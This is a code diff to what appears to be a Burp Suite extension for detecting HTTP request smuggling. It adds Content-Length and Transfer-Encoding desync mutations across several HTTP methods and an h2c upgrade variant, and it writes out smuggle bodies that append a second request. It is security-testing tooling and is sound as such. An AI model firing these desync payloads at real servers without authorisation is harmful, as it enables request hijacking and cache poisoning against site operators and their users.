@@ -24,8 +24,40 @@ STATUS_ERROR = "Error"
 DEFAULT_REPLAY_COUNT = 100
 DEFAULT_CONNECTIONS = 100
 MAX_LOG_LINES = 2000
-MUTATION_EXPECT = "Expect"
-MUTATION_HEAD = "HEAD"
+MUTATION_EXPECT = "CL Expect"
+MUTATION_HEAD = "CL HEAD"
+MUTATION_CL_OPTIONS = "CL OPTIONS"
+MUTATION_CL_TRACE = "CL TRACE"
+MUTATION_CL_GET = "CL GET"
+MUTATION_CL_CONNECT = "CL CONNECT"
+MUTATION_H2_UPGRADE = "H2-Upgrade"
+MUTATION_TE_OPTIONS = "TE OPTIONS"
+MUTATION_TE_TRACE = "TE TRACE"
+MUTATION_TE_GET = "TE GET"
+MUTATION_TE_HEAD = "TE HEAD"
+MUTATION_TE_CONNECT = "TE CONNECT"
+
+DEFAULT_CL_BODY = "GET /sandboxtest%xx HTTP/1.1\r\nX: x"
+DEFAULT_TE_BODY = "22\r\nGET /sandboxtest%xx HTTP/1.1\r\nX: x\r\n0\r\n\r\n"
+
+CL_MUTATIONS = [MUTATION_EXPECT, MUTATION_HEAD, MUTATION_CL_OPTIONS, MUTATION_CL_TRACE, MUTATION_CL_GET, MUTATION_CL_CONNECT, MUTATION_H2_UPGRADE]
+TE_MUTATIONS = [MUTATION_TE_OPTIONS, MUTATION_TE_TRACE, MUTATION_TE_GET, MUTATION_TE_HEAD, MUTATION_TE_CONNECT]
+ALL_MUTATIONS = CL_MUTATIONS + TE_MUTATIONS
+
+MUTATION_METHODS = {
+    MUTATION_EXPECT: "POST",
+    MUTATION_HEAD: "HEAD",
+    MUTATION_CL_OPTIONS: "OPTIONS",
+    MUTATION_CL_TRACE: "TRACE",
+    MUTATION_CL_GET: "GET",
+    MUTATION_CL_CONNECT: "CONNECT",
+    MUTATION_H2_UPGRADE: "POST",
+    MUTATION_TE_OPTIONS: "OPTIONS",
+    MUTATION_TE_TRACE: "TRACE",
+    MUTATION_TE_GET: "GET",
+    MUTATION_TE_HEAD: "HEAD",
+    MUTATION_TE_CONNECT: "CONNECT",
+}
 
 # Shared trust-all SSL context (created once, reused for all sockets)
 _SSL_CTX = None
@@ -302,35 +334,43 @@ class EndpointTableModel(AbstractTableModel):
 
 
 def build_smuggle_request(helpers, raw_request, http_service, body_str, mutation):
-    body_len = len(body_str.encode("ascii"))
+    is_te = mutation in TE_MUTATIONS
+    if is_te:
+        actual_body = DEFAULT_TE_BODY
+    else:
+        actual_body = body_str
+    body_len = len(actual_body.encode("ascii"))
     analyzed = helpers.analyzeRequest(http_service, raw_request)
     headers = list(analyzed.getHeaders())
+    method = MUTATION_METHODS.get(mutation, "POST")
     parts = headers[0].split(" ")
-    if mutation == MUTATION_HEAD:
-        parts[0] = "HEAD"
-    else:
-        parts[0] = "POST"
+    parts[0] = method
     headers[0] = " ".join(parts)
     new_headers = [headers[0]]
     has_expect = False
     has_cl = False
+    has_te = False
+    skip_headers = ["expect:", "content-length:", "transfer-encoding:", "connection:", "upgrade:", "http2-settings:"]
     for h in headers[1:]:
         lower = h.lower()
-        if lower.startswith("expect:"):
-            if mutation == MUTATION_EXPECT:
-                new_headers.append("Expect: 100-Continue")
-                has_expect = True
-            # HEAD mutation: drop the Expect header entirely
-        elif lower.startswith("content-length:"):
-            new_headers.append("Content-Length: %d" % body_len)
-            has_cl = True
-        else:
+        skip = False
+        for prefix in skip_headers:
+            if lower.startswith(prefix):
+                skip = True
+                break
+        if not skip:
             new_headers.append(h)
-    if mutation == MUTATION_EXPECT and not has_expect:
+    if mutation == MUTATION_EXPECT:
         new_headers.append("Expect: 100-Continue")
-    if not has_cl:
+    if mutation == MUTATION_H2_UPGRADE:
+        new_headers.append("Connection: Upgrade, HTTP2-Settings")
+        new_headers.append("Upgrade: h2c")
+        new_headers.append("HTTP2-Settings: AAMAAABkAAQAAP__")
+    if is_te:
+        new_headers.append("Transfer-Encoding: chunked")
+    else:
         new_headers.append("Content-Length: %d" % body_len)
-    body_bytes = helpers.stringToBytes(body_str)
+    body_bytes = helpers.stringToBytes(actual_body)
     return helpers.buildHttpMessage(new_headers, body_bytes)
 
 
@@ -635,10 +675,10 @@ class BurpExtender(IBurpExtender, IHttpListener, ITab):
 
     def get_active_mutations(self):
         mutations = []
-        if self._mut_expect_cb.isSelected():
-            mutations.append(MUTATION_EXPECT)
-        if self._mut_head_cb.isSelected():
-            mutations.append(MUTATION_HEAD)
+        for mut in ALL_MUTATIONS:
+            cb = self._mut_checkboxes.get(mut)
+            if cb is not None and cb.isSelected():
+                mutations.append(mut)
         return mutations
 
     def processHttpMessage(self, tool_flag, message_is_request, message_info):
@@ -719,17 +759,31 @@ class BurpExtender(IBurpExtender, IHttpListener, ITab):
         self._intruder_cb = JCheckBox("Intruder", True)
         row2.add(self._intruder_cb)
         row2.add(Box.createHorizontalStrut(12))
-        row2.add(JLabel("Mutations:"))
-        self._mut_expect_cb = JCheckBox("Expect (POST)", True)
-        self._mut_expect_cb.setToolTipText("POST + Expect: 100-Continue + smuggle body")
-        row2.add(self._mut_expect_cb)
-        self._mut_head_cb = JCheckBox("HEAD", False)
-        self._mut_head_cb.setToolTipText("HEAD method + smuggle body (no Expect header)")
-        row2.add(self._mut_head_cb)
-        row2.add(Box.createHorizontalStrut(12))
         self._autorun_cb = JCheckBox("Auto-run", False)
         row2.add(self._autorun_cb)
         top_wrapper.add(row2)
+        # --- CL mutations row ---
+        self._mut_checkboxes = {}
+        row_cl = JPanel(FlowLayout(FlowLayout.LEFT, 6, 2))
+        row_cl.add(JLabel("CL mutations:"))
+        for mut in CL_MUTATIONS:
+            cb = JCheckBox(mut, True)
+            cb.setToolTipText(
+                "%s method + Content-Length + smuggle body" % MUTATION_METHODS.get(mut, "POST"))
+            row_cl.add(cb)
+            self._mut_checkboxes[mut] = cb
+        top_wrapper.add(row_cl)
+        # --- TE mutations row ---
+        row_te = JPanel(FlowLayout(FlowLayout.LEFT, 6, 2))
+        row_te.add(JLabel("TE mutations:"))
+        for mut in TE_MUTATIONS:
+            cb = JCheckBox(mut, True)
+            cb.setToolTipText(
+                "%s method + Transfer-Encoding: chunked + chunked smuggle body"
+                % MUTATION_METHODS.get(mut, "POST"))
+            row_te.add(cb)
+            self._mut_checkboxes[mut] = cb
+        top_wrapper.add(row_te)
         self._main_panel.add(top_wrapper, BorderLayout.NORTH)
         self._table = JTable(self.table_model)
         self._table.setSelectionMode(ListSelectionModel.MULTIPLE_INTERVAL_SELECTION)
